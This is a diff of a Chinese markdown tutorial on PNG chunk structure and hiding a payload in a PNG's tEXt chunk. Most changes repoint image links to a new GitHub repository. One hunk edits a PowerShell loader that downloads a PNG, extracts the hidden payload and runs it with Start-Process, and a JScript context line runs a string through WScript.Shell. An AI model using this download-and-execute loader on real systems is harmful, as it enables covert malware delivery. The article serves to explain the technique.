@@ -115,9 +115,9 @@ http://www.easyicon.net/language.en/1172671-png_icon.html
 
 标记好的文件格式如图
 
-![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-1.PNG)
+![Alt text](https://raw.githubusercontent.com/jiancanxuepiao/Pic/master/2016-7-15/2-1.png)
 
-![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-2.PNG)
+![Alt text](https://raw.githubusercontent.com/jiancanxuepiao/Pic/master/2016-7-15/2-2.png)
 
 
 
@@ -196,7 +196,7 @@ int main(int argc, char* argv[])
 
 运行后如图，输出`03438445`，同文件中的CRC32校验码相同
 
-![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-3.png)
+![Alt text](https://raw.githubusercontent.com/jiancanxuepiao/Pic/master/2016-7-15/2-3.png)
 
 
 ### (3) gAMA
@@ -248,7 +248,7 @@ CRC：				`AE 42 60 82`
 
 如图
 
-![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-4.png)
+![Alt text](https://raw.githubusercontent.com/jiancanxuepiao/Pic/master/2016-7-15/2-4.png)
 
 
 
@@ -289,7 +289,7 @@ int main(int argc, char* argv[])
 
 如图，程序按照UltraEdit的格式输出，以便后续的格式分析
 
-![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-5.PNG)
+![Alt text](https://raw.githubusercontent.com/jiancanxuepiao/Pic/master/2016-7-15/2-5.png)
 
 
 
@@ -404,9 +404,9 @@ int main(int argc, char* argv[])
 
 运行如图，可获得完整的PNG文件结构
 
-![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-6.PNG)
+![Alt text](https://raw.githubusercontent.com/jiancanxuepiao/Pic/master/2016-7-15/2-6.png)
 
-![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-7.PNG)
+![Alt text](https://raw.githubusercontent.com/jiancanxuepiao/Pic/master/2016-7-15/2-7.png)
 
 
 
@@ -424,11 +424,11 @@ int main(int argc, char* argv[])
 
 如图，使用`Hex Editor`去除辅助数据块gAMA、cHRM和bKGD
 
-![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-8.PNG)
+![Alt text](https://raw.githubusercontent.com/jiancanxuepiao/Pic/master/2016-7-15/2-8.png)
 
 如图，文件大小变化，但不影响PNG文件浏览
 
-![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-9.png)
+![Alt text](https://raw.githubusercontent.com/jiancanxuepiao/Pic/master/2016-7-15/2-9.png)
 
 
 ### 2、程序实现
@@ -547,7 +547,7 @@ int main(int argc, char* argv[])
 
 如图，左边为原始PNG文件大小，右边为去掉所有辅助数据块后的文件，仍然可以正常浏览
 
-![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-10.png)
+![Alt text](https://raw.githubusercontent.com/jiancanxuepiao/Pic/master/2016-7-15/2-10.png)
 
 
 
@@ -593,7 +593,7 @@ CRC：				fa c4 08 76
 
 使用`Hex Editor`插入数据，如图
 
-![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-11.PNG)
+![Alt text](https://raw.githubusercontent.com/jiancanxuepiao/Pic/master/2016-7-15/2-11.png)
 
 保存后，不影响PNG文件浏览
 
@@ -759,7 +759,7 @@ int main(int argc, char* argv[])
 
 使用check.cpp对其进行校验，如图，校验成功
 
-![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-12.PNG)
+![Alt text](https://raw.githubusercontent.com/jiancanxuepiao/Pic/master/2016-7-15/2-12.png)
 
 
 
@@ -786,7 +786,7 @@ new ActiveXObject("WScript.Shell").Run(str);
 ### 2、powershell
 
 ```
-$url = 'https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png'
+$url = 'https://raw.githubusercontent.com/jiancanxuepiao/Pic/master/2016-7-15/new.png'
 $request = New-Object System.Net.WebCLient
 $bytes = $request.DownloadString($url)
 $x=$bytes.indexof("tEXt")
@@ -808,6 +808,14 @@ Start-Process -FilePath $str
 - 添加Payload
 
 - 下载PNG图片解析并执行payload
+
+
+
+---
+
+[LEAVE A REPLY](https://github.com/jiancanxuepiao/Pic/issues/new)
+
+
 
 
 
